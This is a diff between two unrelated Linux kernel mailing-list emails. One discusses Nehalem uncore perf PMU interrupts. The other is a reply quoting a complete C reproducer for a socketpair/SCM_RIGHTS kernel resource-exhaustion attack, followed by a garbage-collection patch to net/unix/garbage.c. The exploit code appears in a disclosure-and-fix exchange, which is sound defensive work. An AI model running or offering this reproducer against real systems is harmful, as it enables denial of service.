@@ -1,82 +1,117 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1751158Ab0KYG0a (ORCPT <rfc822;w@1wt.eu>);
-	Thu, 25 Nov 2010 01:26:30 -0500
-Received: from mga09.intel.com ([134.134.136.24]:17133 "EHLO mga09.intel.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1750879Ab0KYG03 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Thu, 25 Nov 2010 01:26:29 -0500
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="4.59,253,1288594800"; 
-   d="scan'208";a="680904318"
-Subject: Re: [RFC PATCH 2/3 v2] perf: Implement Nehalem uncore pmu
-From: Lin Ming <ming.m.lin@intel.com>
-To: Peter Zijlstra <a.p.zijlstra@chello.nl>
-Cc: Stephane Eranian <eranian@google.com>, Andi Kleen <andi@firstfloor.org>,
-        Ingo Molnar <mingo@elte.hu>, lkml <linux-kernel@vger.kernel.org>,
-        Frederic Weisbecker <fweisbec@gmail.com>,
-        Arjan van de Ven <arjan@infradead.org>
-In-Reply-To: <1290665350.2072.521.camel@laptop>
-References: <1290340877.2245.124.camel@localhost>
-	 <8e9ff9280b0c4a059bc82b5c4a629897.squirrel@www.firstfloor.org>
-	 <1290348259.2245.172.camel@localhost>	<1290361473.2153.39.camel@laptop>
-	 <AANLkTik2_VLiKfZNC3BJeFnqS8kp7bMOg6qhJ1yPGmej@mail.gmail.com>
-	 <1290644675.2405.90.camel@minggr.sh.intel.com>
-	 <1290665350.2072.521.camel@laptop>
+	id S1751525Ab0KYG2a (ORCPT <rfc822;w@1wt.eu>);
+	Thu, 25 Nov 2010 01:28:30 -0500
+Received: from mail-ww0-f44.google.com ([74.125.82.44]:43277 "EHLO
+	mail-ww0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751029Ab0KYG22 (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Thu, 25 Nov 2010 01:28:28 -0500
+DomainKey-Signature: a=rsa-sha1; c=nofws;
+        d=gmail.com; s=gamma;
+        h=subject:from:to:cc:in-reply-to:references:content-type:date
+         :message-id:mime-version:x-mailer:content-transfer-encoding;
+        b=cz18JPtqVaHyebTzo4+p9OLgEEMuPUP4ivRnLhGdAtPYeJUYxlHLEf6r3Y+iSNcJum
+         KF3aX4pj8SiIfapr+JBaEPtwFKc7anPrKFTgCGJDaG++PvA4m2JjWrfaF/trPv07RIBT
+         zPT2YLTI8I5dLnDXdm4f7tTj1vFakAuSfyr0E=
+Subject: Re: Simple kernel attack using socketpair. easy, 100%
+ reproductiblle, works under guest. no way to protect :(
+From: Eric Dumazet <eric.dumazet@gmail.com>
+To: =?UTF-8?Q?=D0=9C=D0=B0=D1=80=D0=BA_?=
+	 =?UTF-8?Q?=D0=9A=D0=BE=D1=80=D0=B5=D0=BD=D0=B1=D0=B5=D1=80=D0=B3?= 
+	<socketpair@gmail.com>
+Cc: linux-kernel@vger.kernel.org, netdev <netdev@vger.kernel.org>,
+        David Miller <davem@davemloft.net>
+In-Reply-To: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
+References: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
 Content-Type: text/plain; charset="UTF-8"
-Date: Thu, 25 Nov 2010 14:27:53 +0800
-Message-ID: <1290666473.2405.108.camel@minggr.sh.intel.com>
+Date: Thu, 25 Nov 2010 07:28:21 +0100
+Message-ID: <1290666501.2798.84.camel@edumazet-laptop>
 Mime-Version: 1.0
-X-Mailer: Evolution 2.30.2 
-Content-Transfer-Encoding: 7bit
+X-Mailer: Evolution 2.30.3 
+Content-Transfer-Encoding: 8bit
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Thu, 2010-11-25 at 14:09 +0800, Peter Zijlstra wrote:
-> On Thu, 2010-11-25 at 08:24 +0800, Lin Ming wrote:
-> > On Tue, 2010-11-23 at 18:00 +0800, Stephane Eranian wrote:
-> > > On Sun, Nov 21, 2010 at 6:44 PM, Peter Zijlstra <a.p.zijlstra@chello.nl> wrote:
-> > > > On Sun, 2010-11-21 at 22:04 +0800, Lin Ming wrote:
-> > > >> On Sun, 2010-11-21 at 20:46 +0800, Andi Kleen wrote:
-> > > >> > >
-> > > >> > > 2. Uncore pmu NMI handling
-> > > >> > >
-> > > >> > > All the 4 cores are programmed to receive uncore counter overflow
-> > > >> > > interrupt. The NMI handler(running on 1 of the 4 cores) handle all
-> > > >> > > counters enabled by all 4 cores.
-> > > >> >
-> > > >> > Really for uncore monitoring there is no need to use an NMI handler.
-> > > >> > You can't profile a core anyways, so you can just delay the reporting
-> > > >> > a little bit. It may simplify the code to not use one here
-> > > >> > and just use an ordinary handler.
-> > > >>
-> > > >> OK, I can use on ordinary interrupt handler here.
-> > > >
-> > > > Does the hardware actually allow using a different interrupt source?
-> > > >
-> > > It does not. It's using whatever you've programmed into the APIC
-> > > LVT vector, AFAIK. Uncore interrupt mode is enabled via
-> > > IA32_DEBUGCTL. Regarless of sampling or not, you need the interrupt
-> > > to virtualize the counters to 64 bits.
-> > 
-> > If only counting(perf stat) makes sense for uncore events, do we still
-> > need an interrupt handler?
+Le jeudi 25 novembre 2010 à 10:57 +0500, Марк Коренберг a écrit :
+> #include <sys/socket.h>
+> #include <sys/un.h>
 > 
-> Yep, I see no reason to dis-allow sampling. Sure its hard to make sense
-> of it, but since there are people who offline all but one cpu of a
-> package, I bet there are people who will run just one task on a package
-> as well.
+> static int send_fd (int unix_fd, int fd)
+> {
+>   struct msghdr msgh;
+>   struct cmsghdr *cmsg;
+>   char buf[CMSG_SPACE (sizeof (fd))];
 > 
-> Just because it doesn't make sense in general doesn't mean there isn't
-> anybody who'd want to do it and actually knows wth he's doing.
+>   memset (&msgh, 0, sizeof (msgh));
+>   memset (buf, 0, sizeof (buf));
 > 
-> > 48 bits counter is not that easy to overflow in practice.
+>   msgh.msg_control = buf;
+>   msgh.msg_controllen = sizeof (buf);
 > 
-> Still..
+>   cmsg = CMSG_FIRSTHDR (&msgh);
+>   cmsg->cmsg_len = CMSG_LEN (sizeof (fd));
+>   cmsg->cmsg_level = SOL_SOCKET;
+>   cmsg->cmsg_type = SCM_RIGHTS;
+> 
+>   msgh.msg_controllen = cmsg->cmsg_len;
+> 
+>   memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
+>   return sendmsg (unix_fd, &msgh, 0);
+> }
+> 
+> 
+> int main ()
+> {
+>   int fd[2], ff[2];
+>   int target;
+> 
+>   if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd)==-1)
+>     return 1;
+> 
+>   for (;;)
+>   {
+>     if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)==-1)
+>         return 2;
+>     send_fd (ff[0], fd[0]);
+>     send_fd (ff[0], fd[1]);
+>     close (fd[1]);
+>     close (fd[0]);
+>     fd[0] = ff[0];
+>     fd[1] = ff[1];
+>   }
+> } 
 
-OK, will do more tests, then send out a new version.
 
-Thanks.
+Since you obviously read recent mails on this subject yesterday, why
+dont you Cc netdev ?
+
+There is a very easy way to protect against this actually.
+
+A patch was posted yesterday, and need some adjustements.
+
+
+diff --git a/net/unix/garbage.c b/net/unix/garbage.c
+index c8df6fd..40df93d 100644
+--- a/net/unix/garbage.c
++++ b/net/unix/garbage.c
+@@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_sock *u)
+ }
+ 
+ static bool gc_in_progress = false;
++#define UNIX_INFLIGHT_TRIGGER_GC 2000
+ 
+ void wait_for_unix_gc(void)
+ {
++	/*
++	 * If number of inflight sockets is insane,
++	 * force a garbage collect right now.
++	 */
++	if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_GC && !gc_in_progress)
++		unix_gc();
+ 	wait_event(unix_gc_wait, gc_in_progress == false);
+ }
+ 
 
 
